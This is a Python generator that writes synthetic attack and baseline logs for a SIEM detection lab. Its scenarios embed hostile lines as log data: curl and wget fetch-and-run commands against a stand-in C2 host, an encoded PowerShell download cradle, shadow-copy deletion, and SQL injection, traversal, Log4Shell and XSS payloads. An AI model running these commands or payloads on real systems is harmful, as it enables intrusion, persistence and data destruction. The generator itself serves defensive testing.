"""Deterministic attack-simulation log generator.

The lab cannot ship real VirtualBox disk images, so the seven-day capture is
reproduced from an explicit, reviewable scenario definition.  Every line the
SIEM ingests is generated here in the *native* format of the source system
(syslog, Windows Security CSV, pfSense CSV, Squid, Sysmon JSON, nginx, mail
gateway JSON), which keeps the parsers honest.

Scenarios
---------
=====  ==============================================================
day    activity
=====  ==============================================================
Oct 19 baseline business activity
Oct 20 HTTP flood (DDoS) + credential stuffing against the web tier
Oct 21 port scan and web exploitation attempts from 198.51.100.23
Oct 22 SSH brute force leading to root compromise of web-srv-02
Oct 23 phishing -> macro -> PowerShell -> C2 on ws-fin-14
Oct 24 lateral movement and ransomware on fs01
Oct 25 insider data exfiltration from fs01 to a known exfil domain
       plus an RDP password spray against jump-01
=====  ==============================================================

``python -m scenarios.generator`` rewrites ``data/logs``.
"""
from __future__ import annotations

import csv
import json
import random
from collections import defaultdict
from datetime import datetime, timedelta
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
LOG_DIR = ROOT / "data" / "logs"
START = datetime(2026, 10, 19, 0, 0, 0)

HOSTS = {
    "dc01": ("dc01.corp.local", "10.10.0.10"),
    "fs01": ("fs01.corp.local", "10.10.0.20"),
    "db01": ("db01.corp.local", "10.10.0.30"),
    "web-srv-02": ("web-srv-02.corp.local", "10.10.0.40"),
    "jump-01": ("jump-01.corp.local", "10.10.0.50"),
    "siem-01": ("siem-01.corp.local", "10.10.0.60"),
    "backup-01": ("backup-01.corp.local", "10.10.0.70"),
    "vuln-scanner-01": ("vuln-scanner-01.corp.local", "10.10.5.20"),
    "ws-fin-14": ("ws-fin-14.corp.local", "10.10.2.14"),
    "ws-hr-07": ("ws-hr-07.corp.local", "10.10.2.7"),
    "ws-dev-03": ("ws-dev-03.corp.local", "10.10.2.3"),
    "ws-eng-21": ("ws-eng-21.corp.local", "10.10.2.21"),
}

WINDOWS_USERS = [
    ("j.patel", "ws-fin-14"),
    ("m.singh", "ws-hr-07"),
    ("r.verma", "ws-eng-21"),
]

BENIGN_WEB_CLIENTS = [
    "192.0.2.10", "192.0.2.21", "192.0.2.33", "192.0.2.45", "192.0.2.60",
    "192.0.2.88", "192.0.2.120", "192.0.2.150", "203.0.113.12", "203.0.113.25",
    "203.0.113.60", "203.0.113.101", "203.0.113.140", "198.51.100.5",
    "198.51.100.50", "198.51.100.88", "198.51.100.120",
]

BROWSING = [
    "https://portal.office.com/",
    "https://github.com/org/repo",
    "https://docs.python.org/3/library/json.html",
    "https://stackoverflow.com/questions/11227809",
    "https://news.ycombinator.com/",
    "https://www.google.com/search?q=quarterly+report",
    "https://grafana.corp.local/dashboards",
    "https://pypi.org/project/requests/",
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/125.0 Safari/537.36",
    "curl/8.5.0",
]

PAYLOAD_SHA = "4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f90112233445566778899aabbccddeeff00"
RANSOMWARE_SHA = "8f14e45fceea167a5a36dedd4bea2543c0f4a1d3c3c2d5b8f1a7e9d2c4b6a8f0"


class Lab:
    def __init__(self, seed: int = 20261031):
        self.rng = random.Random(seed)
        self.auth: list[tuple[datetime, str]] = []
        self.firewall: list[dict] = []
        self.proxy: list[tuple[datetime, str]] = []
        self.sysmon: list[dict] = []
        self.nginx: list[tuple[datetime, str]] = []
        self.mail: list[dict] = []
        self.windows: dict[str, list[dict]] = defaultdict(list)
        self.manifest = {"scenarios": []}

    # -- syslog / auth ---------------------------------------------------
    def _syslog(self, ts, host, proc, pid, msg):
        line = f"{ts:%b} {ts.day:2d} {ts:%H:%M:%S} {host} {proc}[{pid}]: {msg}"
        self.auth.append((ts, line))

    def ssh_fail(self, ts, host, user, ip, port=None):
        port = port or self.rng.randint(30000, 61000)
        self._syslog(ts, host, "sshd", self.rng.randint(1000, 30000),
                     f"Failed password for {'invalid user ' if user in ('admin', 'test', 'oracle') else ''}{user} "
                     f"from {ip} port {port} ssh2")

    def ssh_ok(self, ts, host, user, ip, port=None):
        port = port or self.rng.randint(30000, 61000)
        self._syslog(ts, host, "sshd", self.rng.randint(1000, 30000),
                     f"Accepted password for {user} from {ip} port {port} ssh2")

    def sudo(self, ts, host, user, command):
        self._syslog(ts, host, "sudo", self.rng.randint(1000, 30000),
                     f"{user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND={command}")

    def useradd(self, ts, host, user):
        self._syslog(ts, host, "useradd", self.rng.randint(1000, 30000),
                     f"new user: name={user}, UID=1002, GID=1002, home=/home/{user}, shell=/bin/bash")

    def cron(self, ts, host, user, command):
        self._syslog(ts, host, "CRON", self.rng.randint(1000, 30000),
                     f"(root) CMD ({command})")
        self.sudo(ts, host, user, f"/bin/bash -c 'echo \"*/10 * * * * root {command}\" >> /etc/cron.d/sysmon'")

    # -- Windows Security ------------------------------------------------
    def win(self, ts, host_key, event_id, target_user="", source_ip="", logon_type="",
            process="", command="", message="", subject=""):
        host = HOSTS[host_key][0]
        row = {
            "TimeCreated": f"{ts:%Y-%m-%dT%H:%M:%SZ}",
            "Computer": host,
            "EventID": str(event_id),
            "SubjectUserName": subject,
            "TargetUserName": target_user,
            "IpAddress": source_ip,
            "LogonType": logon_type,
            "ProcessName": process,
            "CommandLine": command,
            "Status": "0x0",
            "Message": message,
        }
        self.windows[host_key].append(row)

    # -- firewall --------------------------------------------------------
    def fw(self, ts, src, dst, port, action="deny", proto="tcp", nbytes=0,
           rule="", interface="wan", host="fw-core-01"):
        self.firewall.append({
            "timestamp": f"{ts:%Y-%m-%dT%H:%M:%SZ}",
            "host": host,
            "src_ip": src,
            "src_interface": "lan" if src.startswith("10.") else "wan",
            "dst_ip": dst,
            "dst_port": str(port),
            "protocol": proto,
            "action": action,
            "bytes": str(nbytes),
            "rule": rule,
            "interface": interface,
        })

    # -- proxy -----------------------------------------------------------
    def proxy_event(self, ts, client, url, method="GET", status=200, nbytes=2500,
                    code="TCP_MISS", user="-"):
        line = (
            f"{ts.timestamp():.3f} {self.rng.randint(5, 240)} {client} {code}/{status} "
            f"{nbytes} {method} {url} {user} DIRECT/93.184.216.34 text/html"
        )
        self.proxy.append((ts, line))

    # -- nginx -----------------------------------------------------------
    def web(self, ts, ip, method, path, status=200, nbytes=512,
            ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0"):
        line = (
            f'{ip} - - [{ts:%d/%b/%Y:%H:%M:%S} +0000] "{method} {path} HTTP/1.1" '
            f'{status} {nbytes} "-" "{ua}"'
        )
        self.nginx.append((ts, line))

    # -- Sysmon ----------------------------------------------------------
    def edr(self, ts, host_key, event_id, **fields):
        record = {"UtcTime": f"{ts:%Y-%m-%dT%H:%M:%SZ}", "Computer": HOSTS[host_key][0], "EventID": event_id}
        record.update({k: v for k, v in fields.items() if v is not None})
        self.sysmon.append(record)

    def process(self, ts, host_key, image, cmdline, parent, user="CORP\\j.patel", sha=None):
        hashes = f"SHA256={sha}" if sha else None
        self.edr(ts, host_key, 1, Image=image, CommandLine=cmdline, ParentImage=parent,
                 User=user, Hashes=hashes)

    # -- mail ------------------------------------------------------------
    def mail_event(self, ts, sender, recipient, subject, verdict="delivered",
                   attachment=None, attachment_sha=None, urls=None, sender_domain=None):
        self.mail.append({
            "timestamp": f"{ts:%Y-%m-%dT%H:%M:%SZ}",
            "src_ip": "203.0.113.45",
            "from": sender,
            "to": recipient,
            "subject": subject,
            "verdict": verdict,
            "attachment": attachment,
            "attachment_sha256": attachment_sha,
            "urls": urls or [],
            "sender_domain": sender_domain or sender.split("@")[-1],
            "message_id": f"<{self.rng.getrandbits(48):012x}@mail.corp.local>",
        })

    # -- output ----------------------------------------------------------
    def write(self) -> dict:
        LOG_DIR.mkdir(parents=True, exist_ok=True)
        for sub in ("auth", "windows", "firewall", "proxy", "edr", "web", "mail"):
            (LOG_DIR / sub).mkdir(parents=True, exist_ok=True)

        auth_lines = [line for _, line in sorted(self.auth)]
        (LOG_DIR / "auth" / "auth.log").write_text("\n".join(auth_lines) + "\n", encoding="utf-8")

        fieldnames = ["TimeCreated", "Computer", "EventID", "SubjectUserName", "TargetUserName",
                      "IpAddress", "LogonType", "ProcessName", "CommandLine", "Status", "Message"]
        windows_files = {}
        for host_key, rows in self.windows.items():
            rows.sort(key=lambda r: r["TimeCreated"])
            path = LOG_DIR / "windows" / f"{host_key}_security.csv"
            with open(path, "w", newline="", encoding="utf-8") as fh:
                writer = csv.DictWriter(fh, fieldnames=fieldnames)
                writer.writeheader()
                writer.writerows(rows)
            windows_files[host_key] = len(rows)

        firewall_fields = ["timestamp", "host", "src_ip", "src_interface", "dst_ip", "dst_port",
                           "protocol", "action", "bytes", "rule", "interface"]
        with open(LOG_DIR / "firewall" / "fw-core-01.csv", "w", newline="", encoding="utf-8") as fh:
            writer = csv.DictWriter(fh, fieldnames=firewall_fields)
            writer.writeheader()
            writer.writerows(sorted(self.firewall, key=lambda r: r["timestamp"]))

        (LOG_DIR / "proxy" / "squid_access.log").write_text(
            "\n".join(line for _, line in sorted(self.proxy)) + "\n", encoding="utf-8")
        (LOG_DIR / "web" / "web-srv-02_access.log").write_text(
            "\n".join(line for _, line in sorted(self.nginx)) + "\n", encoding="utf-8")

        self.sysmon.sort(key=lambda r: r["UtcTime"])
        with open(LOG_DIR / "edr" / "sysmon.jsonl", "w", encoding="utf-8") as fh:
            for record in self.sysmon:
                fh.write(json.dumps(record, sort_keys=False) + "\n")

        with open(LOG_DIR / "mail" / "mail_gateway.jsonl", "w", encoding="utf-8") as fh:
            for record in sorted(self.mail, key=lambda r: r["timestamp"]):
                fh.write(json.dumps(record, sort_keys=False) + "\n")

        manifest = {
            "generated_at": datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ"),
            "window": {"start": f"{START:%Y-%m-%dT%H:%M:%SZ}", "end": "2026-10-25T23:59:59Z"},
            "seed": 20261031,
            "counts": {
                "auth.log": len(auth_lines),
                "windows_security": sum(windows_files.values()),
                "firewall": len(self.firewall),
                "proxy": len(self.proxy),
                "sysmon": len(self.sysmon),
                "nginx": len(self.nginx),
                "mail": len(self.mail),
            },
            "windows_hosts": windows_files,
            "scenarios": self.manifest["scenarios"],
        }
        (LOG_DIR / "manifest.json").write_text(json.dumps(manifest, indent=2) + "\n", encoding="utf-8")
        return manifest


# ---------------------------------------------------------------------------
# Baseline activity
# ---------------------------------------------------------------------------

def baseline(lab: Lab) -> None:
    rng = lab.rng
    for day in range(7):
        date = START + timedelta(days=day)
        weekday = date.weekday() < 5

        # Windows users log on during business hours.
        if weekday:
            for user, host_key in WINDOWS_USERS:
                host, ip = HOSTS[host_key]
                login = date + timedelta(hours=8, minutes=rng.randint(10, 55))
                lab.win(login, host_key, 4624, target_user=user, logon_type="2",
                        message=f"An account was successfully logged on ({user})")
                lab.process(login + timedelta(minutes=1), host_key,
                            "C:\\Windows\\explorer.exe", "C:\\Windows\\explorer.exe",
                            "C:\\Windows\\System32\\userinit.exe", user=f"CORP\\{user}")
                lab.process(login + timedelta(minutes=4), host_key,
                            "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                            '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"',
                            "C:\\Windows\\explorer.exe", user=f"CORP\\{user}")
                lab.process(login + timedelta(minutes=5), host_key,
                            "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
                            '"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"',
                            "C:\\Windows\\explorer.exe", user=f"CORP\\{user}")
                lab.process(login + timedelta(minutes=6), host_key,
                            "C:\\Program Files\\WindowsApps\\ms-teams.exe", "ms-teams.exe",
                            "C:\\Windows\\explorer.exe", user=f"CORP\\{user}")
                # Browsing through the authenticated proxy.
                for _ in range(4):
                    ts = date + timedelta(hours=rng.randint(9, 17), minutes=rng.randint(0, 59))
                    lab.proxy_event(ts, ip, rng.choice(BROWSING), nbytes=rng.randint(2000, 450000))
                    lab.fw(ts, ip, "93.184.216.34", 443, action="allow",
                           nbytes=rng.randint(2000, 450000), rule="lan-to-wan-web")
                # Kerberos/LDAP chatter to the domain controller.
                lab.fw(login + timedelta(minutes=2), ip, "10.10.0.10", 389, action="allow",
                       nbytes=rng.randint(500, 4000), rule="lan-to-dc")
                lab.win(date + timedelta(hours=18, minutes=rng.randint(0, 20)), host_key, 4634,
                        target_user=user, logon_type="2",
                        message=f"An account was logged off ({user})")

            # Linux administrators work from the jump host.
            lab.ssh_ok(date + timedelta(hours=9, minutes=15), "web-srv-02.corp.local", "deploy", "10.10.0.50")
            lab.sudo(date + timedelta(hours=9, minutes=20), "web-srv-02.corp.local", "deploy",
                     "/bin/systemctl restart nginx")
            lab.ssh_ok(date + timedelta(hours=9, minutes=5), "db01.corp.local", "dba", "10.10.0.50")
            lab.sudo(date + timedelta(hours=9, minutes=25), "db01.corp.local", "dba",
                     "/usr/bin/pg_dump -U postgres billing > /var/backups/billing.dump")
            lab.ssh_ok(date + timedelta(hours=8, minutes=40), "ws-dev-03.corp.local", "a.khan", "10.10.0.50")
            lab.sudo(date + timedelta(hours=8, minutes=45), "ws-dev-03.corp.local", "a.khan",
                     "/usr/bin/apt-get install -y jq")

        # Public web traffic to the reverse proxy.
        for _ in range(10 if weekday else 4):
            ts = date + timedelta(hours=rng.randint(0, 23), minutes=rng.randint(0, 59),
                                  seconds=rng.randint(0, 59))
            lab.web(ts, rng.choice(BENIGN_WEB_CLIENTS), "GET",
                    rng.choice(["/", "/login", "/api/v1/products", "/assets/app.js", "/healthz"]),
                    status=200, nbytes=rng.randint(400, 9000),
                    ua=rng.choice(USER_AGENTS))

        # Nightly backup replication (allowlisted large transfer).
        backup_size = 6500 * 1024 * 1024 if day == 2 else rng.randint(1600, 1900) * 1024 * 1024
        lab.fw(date + timedelta(hours=1, minutes=5), "10.10.0.70", "192.0.2.150", 443,
               action="allow", nbytes=backup_size, rule="backup-replication")

    # Benign password typos across the week: a real baseline of low-volume
    # authentication failures for the anomaly model to learn from.
    typo_events = [
        (0, 9, 12, "ws-dev-03.corp.local", "a.khan", "10.10.0.50", 1),
        (0, 14, 40, "db01.corp.local", "dba", "10.10.0.50", 1),
        (1, 8, 55, "ws-dev-03.corp.local", "a.khan", "10.10.0.50", 2),
        (2, 9, 5, "web-srv-02.corp.local", "deploy", "10.10.0.50", 1),
        (2, 16, 20, "db01.corp.local", "dba", "10.10.0.50", 1),
        (3, 8, 47, "ws-dev-03.corp.local", "a.khan", "10.10.0.50", 1),
        (3, 13, 33, "db01.corp.local", "dba", "10.10.0.50", 2),
        (4, 9, 22, "web-srv-02.corp.local", "deploy", "10.10.0.50", 1),
        (5, 11, 5, "ws-dev-03.corp.local", "a.khan", "10.10.0.50", 1),
        (6, 15, 45, "db01.corp.local", "dba", "10.10.0.50", 1),
    ]
    for day, hour, minute, host, user, ip, count in typo_events:
        for index in range(count):
            lab.ssh_fail(START + timedelta(days=day, hours=hour, minutes=minute + index),
                         host, user, ip)

    # False-positive trap 1: administrator typo (2 failures, then success).
    trap = START + timedelta(days=1, hours=10, minutes=12)
    lab.ssh_fail(trap, "web-srv-02.corp.local", "deploy", "10.10.0.50")
    lab.ssh_fail(trap + timedelta(seconds=22), "web-srv-02.corp.local", "deploy", "10.10.0.50")
    lab.ssh_ok(trap + timedelta(seconds=40), "web-srv-02.corp.local", "deploy", "10.10.0.50")

    # False-positive trap 2: authorised Nessus scan (suppressed by AL-001).
    scan_start = START + timedelta(days=3, hours=2)
    targets = ["10.10.0.40", "10.10.0.30", "10.10.0.20", "10.10.0.10"]
    ports = [21, 22, 23, 25, 53, 80, 139, 443, 445, 1433, 3306, 3389, 5432, 8080, 8443]
    index = 0
    for target in targets:
        for port in ports[:10]:
            lab.fw(scan_start + timedelta(seconds=index * 4), "10.10.5.20", target, port,
                   action="deny", rule="default-deny", interface="lan")
            index += 1

    # False-positive trap 3: service-account share access at night (suppressed by AL-003).
    for day in (2, 4):
        ts = START + timedelta(days=day, hours=2, minutes=30)
        lab.win(ts, "fs01", 4624, target_user="svc_backup", source_ip="10.10.0.70",
                logon_type="3", message="Backup service account accessed HR share")


# ---------------------------------------------------------------------------
# Scenario: HTTP flood + credential stuffing (Oct 20)
# ---------------------------------------------------------------------------

def scenario_ddos_and_stuffing(lab: Lab) -> None:
    start = START + timedelta(days=1, hours=14)
    uas = ["Mozilla/5.0 (compatible; MSIE 9.0)", "python-requests/2.31.0", "curl/7.68.0"]
    for index in range(330):
        ts = start + timedelta(seconds=index * 0.9)
        lab.web(ts, "203.0.113.199", "GET", f"/?s={index}",
                status=503 if index % 3 else 200, nbytes=196,
                ua=uas[index % len(uas)])
        if index % 60 == 0:
            lab.fw(ts, "203.0.113.199", "10.10.0.40", 443, action="allow",
                   nbytes=800, rule="web-inbound")
    lab.manifest["scenarios"].append({
        "name": "HTTP flood",
        "date": "2026-10-20",
        "attacker": "203.0.113.199",
        "target": "web-srv-02",
        "events": 330,
        "expected_rules": ["DET-012"],
    })

    stuff = START + timedelta(days=1, hours=15)
    for index in range(60):
        ts = stuff + timedelta(seconds=index * 7)
        lab.web(ts, "203.0.113.120", "POST", f"/login?user=user{index}%40corp.local",
                status=401, nbytes=204, ua="python-requests/2.31.0")
    lab.manifest["scenarios"].append({
        "name": "Credential stuffing",
        "date": "2026-10-20",
        "attacker": "203.0.113.120",
        "target": "web-srv-02 /login",
        "events": 60,
        "expected_rules": ["DET-013"],
    })


# ---------------------------------------------------------------------------
# Scenario: reconnaissance + exploitation attempts (Oct 21)
# ---------------------------------------------------------------------------

def scenario_recon_web_attack(lab: Lab) -> None:
    scan = START + timedelta(days=2, hours=1, minutes=40)
    index = 0
    for target in ("10.10.0.40", "10.10.0.30", "10.10.0.20", "10.10.0.10"):
        for port in (21, 22, 23, 25, 80, 443, 445, 3306, 3389, 5432, 6379, 8080, 8443, 9200, 11211):
            lab.fw(scan + timedelta(seconds=index * 2), "198.51.100.23", target, port,
                   action="deny", rule="default-deny")
            index += 1
    lab.manifest["scenarios"].append({
        "name": "Port scan",
        "date": "2026-10-21",
        "attacker": "198.51.100.23",
        "target": "10.10.0.0/16 perimeter",
        "events": index,
        "expected_rules": ["DET-010"],
    })

    exploit = START + timedelta(days=2, hours=2, minutes=5)
    payloads = [
        "/product?id=1%27%20OR%20%271%27=%271",
        "/../../../../etc/passwd",
        "/..%2f..%2f..%2fetc%2fpasswd",
        "/wp-admin/admin-ajax.php",
        "/cgi-bin/.%2e/%2e%2e/bin/sh",
        "/actuator/env",
        "/%24%7Bjndi:ldap://198.51.100.23:1389/a%7D",
        "/login?next=<script>alert(1)</script>",
    ]
    for offset, payload in enumerate(payloads):
        lab.web(exploit + timedelta(seconds=offset * 11), "198.51.100.23", "GET", payload,
                status=403 if offset % 2 else 400, nbytes=157,
                ua="sqlmap/1.7.2#stable (https://sqlmap.org)")
    # A few SSH probes that stay below the brute-force threshold.
    for offset in range(6):
        lab.ssh_fail(exploit + timedelta(minutes=offset * 3), "web-srv-02.corp.local",
                     "admin", "198.51.100.23")
    lab.manifest["scenarios"].append({
        "name": "Web exploitation attempts",
        "date": "2026-10-21",
        "attacker": "198.51.100.23",
        "target": "web-srv-02",
        "events": len(payloads) + 6,
        "expected_rules": ["DET-011"],
    })


# ---------------------------------------------------------------------------
# Scenario: SSH brute force -> root compromise (Oct 22)
# ---------------------------------------------------------------------------

def scenario_ssh_compromise(lab: Lab) -> None:
    start = START + timedelta(days=3, hours=3)
    users = ["root", "admin", "test", "oracle", "deploy", "ubuntu"]
    for index in range(12):
        lab.ssh_fail(start + timedelta(minutes=index), "web-srv-02.corp.local",
                     users[index % len(users)], "203.0.113.44")
    success = start + timedelta(minutes=14)
    lab.ssh_ok(success, "web-srv-02.corp.local", "deploy", "203.0.113.44")
    lab.sudo(success + timedelta(minutes=2), "web-srv-02.corp.local", "deploy",
             "/usr/bin/wget http://cdn-update-sync.com/ldr.sh -O /tmp/.x")
    lab.sudo(success + timedelta(minutes=3), "web-srv-02.corp.local", "deploy", "/bin/bash /tmp/.x")
    lab.sudo(success + timedelta(minutes=4), "web-srv-02.corp.local", "deploy",
             "/usr/sbin/useradd -m -s /bin/bash svcmon")
    lab.useradd(success + timedelta(minutes=4, seconds=2), "web-srv-02.corp.local", "svcmon")
    lab.sudo(success + timedelta(minutes=5), "web-srv-02.corp.local", "deploy",
             "/usr/sbin/usermod -aG sudo svcmon")
    lab.cron(success + timedelta(minutes=7), "web-srv-02.corp.local", "deploy",
             "/usr/bin/curl -s http://cdn-update-sync.com/beacon | /bin/bash")
    lab.manifest["scenarios"].append({
        "name": "SSH brute force and privilege escalation",
        "date": "2026-10-22",
        "attacker": "203.0.113.44",
        "target": "web-srv-02",
        "events": 12 + 1 + 6,
        "expected_rules": ["DET-001", "DET-002", "DET-035", "DET-036", "ANO-002"],
    })


# ---------------------------------------------------------------------------
# Scenario: phishing -> malware -> C2 (Oct 23)
# ---------------------------------------------------------------------------

def scenario_phishing_malware(lab: Lab) -> None:
    base = START + timedelta(days=4, hours=9, minutes=12)
    lab.mail_event(
        base,
        "billing@secure-auth-portal.com",
        "j.patel@corp.local",
        "Invoice_Oct2026.zip - payment overdue",
        attachment="Invoice_Oct2026.zip",
        attachment_sha=PAYLOAD_SHA,
        urls=["https://secure-auth-portal.com/invoice"],
        sender_domain="secure-auth-portal.com",
    )
    lab.edr(base + timedelta(minutes=19), "ws-fin-14", 11,
            TargetFilename="C:\\Users\\j.patel\\Downloads\\Invoice_Oct2026.zip",
            Image="C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE")
    lab.process(base + timedelta(minutes=21), "ws-fin-14",
                "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
                '"WINWORD.EXE" /n "C:\\Users\\j.patel\\Downloads\\Invoice_Oct2026.zip\\Invoice.docm"',
                "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
                user="CORP\\j.patel")
    lab.process(base + timedelta(minutes=22), "ws-fin-14",
                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA",
                "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
                user="CORP\\j.patel")
    lab.edr(base + timedelta(minutes=23), "ws-fin-14", 22,
            QueryName="cdn-update-sync.com", Image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            User="CORP\\j.patel")
    lab.edr(base + timedelta(minutes=23, seconds=30), "ws-fin-14", 3,
            Image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            DestinationIp="192.0.2.88", DestinationPort="443", Protocol="tcp",
            User="CORP\\j.patel")
    lab.edr(base + timedelta(minutes=24), "ws-fin-14", 11,
            TargetFilename="C:\\Users\\j.patel\\AppData\\Local\\Temp\\invoice_2026.exe",
            Image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            Hashes=f"SHA256={PAYLOAD_SHA}")
    lab.process(base + timedelta(minutes=25), "ws-fin-14",
                "C:\\Users\\j.patel\\AppData\\Local\\Temp\\invoice_2026.exe",
                "invoice_2026.exe /quiet", "C:\\Windows\\System32\\cmd.exe",
                user="CORP\\j.patel", sha=PAYLOAD_SHA)
    lab.edr(base + timedelta(minutes=26), "ws-fin-14", 13,
            TargetObject="HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WinUpdateSvc",
            Details="C:\\Users\\j.patel\\AppData\\Local\\Temp\\invoice_2026.exe",
            Image="invoice_2026.exe", User="CORP\\j.patel")
    lab.process(base + timedelta(minutes=28), "ws-fin-14",
                "C:\\Windows\\System32\\schtasks.exe",
                'schtasks.exe /create /tn "WinUpdateSvc" /tr "C:\\Users\\j.patel\\AppData\\Local\\Temp\\invoice_2026.exe" /sc minute /mo 15 /ru SYSTEM',
                "C:\\Users\\j.patel\\AppData\\Local\\Temp\\invoice_2026.exe",
                user="CORP\\j.patel")
    lab.edr(base + timedelta(hours=1, minutes=18), "ws-fin-14", 10,
            Image="C:\\Windows\\System32\\rundll32.exe",
            TargetImage="C:\\Windows\\System32\\lsass.exe",
            GrantedAccess="0x1010", User="CORP\\j.patel")
    # The implant keeps trying to reach its C2 through the authenticated proxy,
    # which denies the destination (DET-040 coverage).
    for index in range(55):
        lab.proxy_event(base + timedelta(minutes=32, seconds=index * 9), "10.10.2.14",
                        "http://cdn-update-sync.com/beacon", method="POST", status=403,
                        nbytes=0, code="TCP_DENIED", user="j.patel")
    for index in range(9):
        lab.edr(base + timedelta(hours=1, minutes=33 + index * 5), "ws-fin-14", 3,
                Image="C:\\Users\\j.patel\\AppData\\Local\\Temp\\invoice_2026.exe",
                DestinationIp="192.0.2.77", DestinationPort="8443", Protocol="tcp",
                User="CORP\\j.patel")
    lab.manifest["scenarios"].append({
        "name": "Phishing to command and control",
        "date": "2026-10-23",
        "attacker": "secure-auth-portal.com / 192.0.2.77",
        "target": "ws-fin-14 (j.patel)",
        "events": 9,
        "expected_rules": ["DET-020", "DET-021", "DET-022", "DET-024", "DET-025",
                           "DET-026", "DET-027", "DET-023", "ANO-003"],
    })


# ---------------------------------------------------------------------------
# Scenario: lateral movement + ransomware (Oct 24)
# ---------------------------------------------------------------------------

def scenario_ransomware(lab: Lab) -> None:
    base = START + timedelta(days=5, hours=2, minutes=10)
    for host_key in ("fs01", "dc01", "db01"):
        lab.win(base, host_key, 4624, target_user="j.patel", source_ip="10.10.2.14",
                logon_type="3", message="Network logon from finance workstation")
    lab.process(base + timedelta(minutes=5), "fs01",
                "C:\\Windows\\System32\\cmd.exe",
                'cmd.exe /c vssadmin.exe delete shadows /all /quiet',
                "C:\\Windows\\Temp\\svc.exe", user="CORP\\j.patel")
    lab.edr(base + timedelta(minutes=6), "fs01", 11,
            TargetFilename="C:\\Windows\\Temp\\svc.exe",
            Image="C:\\Windows\\System32\\cmd.exe", Hashes=f"SHA256={RANSOMWARE_SHA}")
    for index in range(120):
        ts = base + timedelta(minutes=6, seconds=index * 3)
        lab.edr(ts, "fs01", 11,
                TargetFilename=f"D:\\Finance\\2026\\Q3\\ledger_{index:04d}.xlsx.locked",
                Image="C:\\Windows\\Temp\\svc.exe")
    lab.win(base + timedelta(minutes=12), "fs01", 7045, target_user="SYSTEM",
            process="WinSecSvc",
            command="C:\\Windows\\Temp\\svc.exe",
            message="A service was installed in the system: WinSecSvc")
    lab.edr(base + timedelta(minutes=13), "fs01", 1,
            Image="C:\\Windows\\Temp\\svc.exe", CommandLine="svc.exe /encrypt",
            ParentImage="C:\\Windows\\System32\\services.exe", User="NT AUTHORITY\\SYSTEM")
    lab.win(base + timedelta(minutes=30), "fs01", 1102, subject="CORP\\j.patel",
            message="The audit log was cleared")
    lab.manifest["scenarios"].append({
        "name": "Lateral movement and ransomware",
        "date": "2026-10-24",
        "attacker": "10.10.2.14 (compromised ws-fin-14)",
        "target": "fs01, dc01, db01",
        "events": 120 + 8,
        "expected_rules": ["DET-033", "DET-030", "DET-031", "DET-032", "DET-027",
                           "DET-039", "ANO-003"],
    })


# ---------------------------------------------------------------------------
# Scenario: insider data exfiltration + RDP spray (Oct 25)
# ---------------------------------------------------------------------------

def scenario_exfiltration_and_rdp(lab: Lab) -> None:
    base = START + timedelta(days=6, minutes=40)  # 00:40 on Oct 25
    lab.win(base, "ws-hr-07", 4624, target_user="m.singh", logon_type="2",
            message="Interactive logon outside business hours")
    lab.win(base + timedelta(minutes=12), "fs01", 4624, target_user="m.singh",
            source_ip="10.10.2.7", logon_type="3",
            message="Network logon to HR share")
    lab.process(base + timedelta(minutes=22), "ws-hr-07",
                "C:\\Windows\\System32\\robocopy.exe",
                'robocopy "\\\\fs01\\HR-Salaries" "C:\\Users\\m.singh\\AppData\\Local\\Temp\\hr" /E /R:1',
                "C:\\Windows\\System32\\cmd.exe", user="CORP\\m.singh")
    uploads = [(5, 4200), (20, 1200), (35, 900)]
    for minutes, megabytes in uploads:
        ts = base + timedelta(minutes=minutes)
        lab.proxy_event(ts, "10.10.2.7", "https://data-share-cloud.net/upload",
                        method="POST", status=200, nbytes=megabytes * 1024 * 1024,
                        user="m.singh")
        lab.fw(ts, "10.10.2.7", "203.0.113.199", 443, action="allow",
               nbytes=megabytes * 1024 * 1024, rule="lan-to-wan-web")
    lab.win(base + timedelta(minutes=70), "ws-hr-07", 4634, target_user="m.singh",
            logon_type="2", message="Logoff after off-hours session")

    rdp = START + timedelta(days=6, hours=4)
    for index in range(12):
        lab.win(rdp + timedelta(minutes=index), "jump-01", 4625, target_user="administrator",
                source_ip="203.0.113.44", logon_type="3",
                message="An account failed to log on (RDP password spray)")
    lab.manifest["scenarios"].append({
        "name": "Insider data exfiltration",
        "date": "2026-10-25",
        "attacker": "m.singh (insider)",
        "target": "fs01 -> data-share-cloud.net",
        "events": 8,
        "expected_rules": ["DET-034", "DET-037", "DET-038", "ANO-001"],
    })
    lab.manifest["scenarios"].append({
        "name": "RDP password spray",
        "date": "2026-10-25",
        "attacker": "203.0.113.44",
        "target": "jump-01",
        "events": 12,
        "expected_rules": ["DET-003", "ANO-002"],
    })


# ---------------------------------------------------------------------------
# Entry point
